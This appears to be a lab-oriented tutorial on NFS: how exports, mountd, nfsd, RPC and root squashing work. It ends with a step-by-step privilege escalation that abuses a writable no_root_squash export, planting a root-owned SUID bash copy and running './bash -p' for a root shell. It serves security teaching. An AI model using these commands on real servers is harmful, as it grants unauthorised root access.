## What is NFS?

**NFS (Network File System)** allows a system to share directories and files with other systems over a network.

In simple terms:

> **NFS allows a computer to share a directory over the network so another computer can mount and access it as if it were a local directory.**

```text
NFS Server
10.10.10.10
    │
    │ shares /home/user/share
    ▼
 Network
    │
    ▼
Your Machine
    │
    └── mounts it as /mnt/share
```

---

# NFS vs SMB

Both NFS and SMB are network file-sharing protocols.

|Feature|NFS|SMB|
|---|---|---|
|Main purpose|Network file sharing|Network file sharing|
|Common environment|Linux / Unix|Windows|
|Example|`server:/share`|`//server/share`|
|Typical port|**2049**|**445**|
|Common client tools|`mount`, NFS utilities|`smbclient`|

---

# How NFS Works

Suppose the NFS server has:
```text
/home/user/share/
├── notes.txt
├── backup.zip
└── secret.txt
```

The server exports the directory:
```text
/home/user/share
```

A client can then mount it:
```bash
sudo mount 10.10.10.10:/home/user/share /mnt/share
```

The directory is now accessible locally:
```bash
cd /mnt/share
ls
```

Output:
```text
notes.txt
backup.zip
secret.txt
```

From the client's perspective, `/mnt/share` behaves like a normal directory.

---

# NFS Components

## Mounting a Share

When a client requests to mount an NFS directory, the request is handled through the NFS/RPC services.

The server checks whether the client is allowed to mount the requested directory.

If the request is accepted, the server provides a **file handle** that identifies the exported filesystem objects.

```text
Client                          NFS Server
  │                                │
  │ "Can I mount /home/share?"     │
  │ ─────────── RPC ─────────────> │
  │                                │
  │                         mountd checks
  │                         export permissions
  │                                │
  │ <────── file handle ────────── │
  │                                │
  ▼                                │
Mounts the directory               │
```

### Daemon
A **daemon** is a background process that provides a service and waits for requests.

### `mountd`
`mountd` is an NFS server component responsible for handling **mount requests** and checking whether clients are allowed to mount exported directories.

### `nfsd`
`nfsd` is the NFS server daemon that handles actual NFS file operations after a filesystem has been mounted.

---

# What is RPC?

**RPC = Remote Procedure Call**

RPC is a mechanism that allows one system to request an operation from another system over a network.

Think of it as:
> "Run this operation on the remote system."

In NFS:
```text
RPC
 │
 ├── Communication mechanism
 │
 └── Used by NFS-related services
```

So remember:
> **RPC = communication mechanism**  
> **mountd = handles mount requests**  
> **nfsd = handles NFS file operations**

---

# File Handles

After a successful mount request, the server provides a **file handle**.

A file handle is an identifier that allows the NFS server to identify a specific file or directory on the exported filesystem.

When the client accesses a file, the NFS request can contain information such as:
- File handle
- File or directory name
- User ID (UID)
- Group ID (GID)
- Requested operation

The server uses this information when determining whether the requested operation is allowed.
```text
Client
  │
  │ NFS request
  │
  ├── File handle
  ├── File name
  ├── UID
  ├── GID
  └── Operation
  │
  ▼
NFS Server
  │
  └── Checks permissions
```

---

# NFS Enumeration

Before mounting an NFS share, enumerate the server's exported directories.

## `showmount`

```bash
/usr/sbin/showmount -e TARGET_IP
```
This asks the NFS server for its exported directories.

Example:
```text
Export list for TARGET_IP:
/home/user
/backup
```

This tells us that the server is exporting:
```text
/home/user
/backup
```

### Useful Enumeration

You may also check RPC services:
```bash
rpcinfo -p TARGET_IP
```

This can help identify services registered with RPC, including NFS-related services.

---

# Mounting an NFS Share

First, create a local mount point:
```bash
mkdir /tmp/mount
```

> `/tmp` is temporary and may be cleared after a reboot.

Mount the NFS share:
```bash
sudo mount -t nfs TARGET_IP:/the_shared_directory /tmp/mount
```

### Command Breakdown
```text
mount
 │
 ├── -t nfs
 │     └── Filesystem type is NFS
 │
 ├── TARGET_IP:/the_shared_directory
 │     └── Remote NFS export
 │
 └── /tmp/mount
       └── Local mount point
```

You may encounter:
```bash
sudo mount -t nfs TARGET_IP:/the_shared_directory /tmp/mount -nolock
```

`-nolock` disables NFS file locking. This can be useful with older NFS configurations or certain lab environments, but it should not be assumed to be required for every NFS mount.

After mounting:
```bash
ls -la /tmp/mount
```

---

# NFS Permissions

NFS commonly relies on **UID/GID-based permissions**.

The server does not necessarily authenticate the username itself for every file operation. Instead, the client's UID and GID can be used when determining access.

For example:
```text
Client
UID 1001
GID 1001
   │
   ▼
NFS Server
   │
   └── Evaluates permissions for UID/GID
```
This is why UID/GID handling is extremely important when analyzing NFS security.

---

# Root Squashing

## What is `root_squash`?

**Root squashing** is an NFS security feature that prevents a remote root user from being treated as root on the NFS server.

With root squashing enabled:
```text
Client root
    │
    ▼
NFS Server
    │
    └── Mapped to an unprivileged identity
```

Typically, the remote root UID is mapped to an anonymous/unprivileged account such as `nobody` or `nfsnobody`, depending on the system configuration.

This prevents a client-side root user from automatically gaining root-level ownership and privileges over files on the NFS server.

---

# `no_root_squash`

An export may instead be configured with:
```text
no_root_squash
```

This disables root squashing.

Conceptually:
```text
Client root
    │
    ▼
NFS Server
    │
    └── Root identity is preserved
```

This is a **dangerous configuration when combined with writable exports**, because a root user on the client may be able to create or modify files on the exported filesystem with root ownership.

Example export:
```text
/home *(rw,no_root_squash)
```

The important vulnerability is therefore not simply:
> "NFS is enabled."

It is:
> **A writable NFS export with `no_root_squash` can allow a root user on the client to create root-owned files on the server's exported filesystem.**

---

# Checking NFS Export Configuration

On the NFS server:
```bash
cat /etc/exports
```

Example:
```text
/home *(rw,no_root_squash)
```

Important options:

|Option|Meaning|
|---|---|
|`rw`|Export is writable|
|`ro`|Export is read-only|
|`root_squash`|Maps remote root to an unprivileged identity|
|`no_root_squash`|Does not squash remote root|
|`sync`|Writes are committed synchronously|
|`async`|Allows asynchronous writes|

---

# Privilege Escalation via `no_root_squash`

A classic  scenario is:
```text
Writable NFS export
        +
no_root_squash
        +
Root access to the NFS client
        ↓
Ability to create root-owned files
        ↓
Potential SUID executable abuse
```

The general attack chain is:
```text
NFS Enumeration
      ↓
Find writable export
      ↓
Identify no_root_squash
      ↓
Mount the share
      ↓
Create/modify a file on the export as root
      ↓
File is owned by root on the server
      ↓
If an executable is made SUID
      ↓
Potential privilege escalation
```

---

# SUID and NFS

## What is SUID?

**SUID (Set User ID)** is a special permission on executable files.

Normally:
```text
User
  │
  ▼
Executable
  │
  └── Runs with user's privileges
```

With SUID:
```text
User
  │
  ▼
SUID executable
  │
  └── Runs with file owner's effective privileges
```

Example:
```text
-rwsr-xr-x
   ↑
  SUID
```

If the executable is owned by root:
```text
root root executable
```

then executing it may cause the process to run with **root's effective privileges**.

---

# Why `no_root_squash` Matters

Consider a writable NFS export:
```text
/home *(rw,no_root_squash)
```

A root user on the client mounts the share:

```text
Client
  │
  │ root
  ▼
NFS Share
  │
  ▼
Server
```

Because `no_root_squash` is enabled, the server does not map the remote root identity to an unprivileged account.

Therefore, the client-side root user may be able to create files that appear as:
```text
root root
```
on the server.

This can become dangerous if the attacker can create or modify an executable and set the SUID bit.

---

# Using a Compatible Executable To priv esc

In a controlled lab, you may use an executable compatible with the target system.

For example, if the lab specifically requires a Bash binary, obtain a copy from the target:
```bash
scp -i id_rsa username@TARGET_IP:/bin/bash ~/Downloads/bash
```

Now:
```text
~/Downloads/bash
```

contains the executable.

Copy it into the mounted export:
```bash
cp ~/Downloads/bash /tmp/mount/USERNAME/
```

Verify:
```bash
ls -l /tmp/mount/USERNAME/bash
```

# Setting Root Ownership and SUID

If the NFS export is writable and `no_root_squash` is enabled, a root user on the client may be able to change the ownership and permissions of the file:

```bash
sudo chown root:root /tmp/mount/USERNAME/bash
sudo chmod +s /tmp/mount/USERNAME/bash
```

Verify:
```bash
ls -l /tmp/mount/USERNAME/bash
```

You may see:
```text
-rwsr-xr-x 1 root root ... bash
```

The important parts are:
```text
root root
```

and:
```text
rws
```
The `s` indicates that SUID is enabled.

# Accessing the SUID Executable

Connect to the target:
```bash
ssh -i id_rsa username@TARGET_IP
```

Navigate to the directory:
```bash
cd /home/USERNAME
```

Verify:
```bash
ls -l bash
```

If the permissions remain:
```text
-rwsr-xr-x
```

the SUID bit has been preserved.

In a controlled lab, the executable can then be invoked according to the lab's intended privilege-escalation exercise. For Bash specifically, `-p` is commonly used because it tells Bash to preserve privileged execution instead of dropping privileges.

```bash
./bash -p
```

Then verify the effective identity:
```bash
whoami
```

Expected in the vulnerable lab:
```text
root
```

---

# Complete Attack Chain

```text
                NFS
                 │
                 ▼
        Enumerate exports
                 │
                 ▼
       Find writable export
                 │
                 ▼
        Check /etc/exports
                 │
                 ▼
          no_root_squash
                 │
                 ▼
        Mount NFS share
                 │
                 ▼
       Access exported files
                 │
                 ▼
     Place compatible executable
                 │
                 ▼
       root-owned + SUID
                 │
                 ▼
       Execute on the target
                 │
                 ▼
         Elevated privileges
```

---

# Key Concepts to Remember

### NFS
> **Network File System — shares files and directories over a network.**

### `showmount`
> **Enumerates NFS exports exposed by the server.**

```bash
showmount -e TARGET_IP
```

### `mount`
> **Makes the remote NFS export accessible through a local directory.**

```bash
sudo mount -t nfs TARGET_IP:/share /mnt/share
```

### RPC
> **Communication mechanism used by distributed services such as NFS.**

### `mountd`
> **Handles NFS mount requests and export access checks.**

### `nfsd`
> **Handles NFS file operations after the filesystem is mounted.**

### `root_squash`
> **Prevents remote root from being treated as root on the NFS server.**

### `no_root_squash`
> **Preserves the remote root identity on the NFS server.**

### SUID
> **Allows an executable to run with the effective privileges of its owner.**

### Critical Misconfiguration

The dangerous combination is:
```text
Writable NFS Export
        +
no_root_squash
        +
Root access to client
        ↓
Potential root-owned file / SUID abuse
```

## One-Line Summary
> **NFS privilege escalation commonly occurs when a writable export uses `no_root_squash`, allowing a root user on the client to create root-owned files on the server and potentially abuse privileged executables.**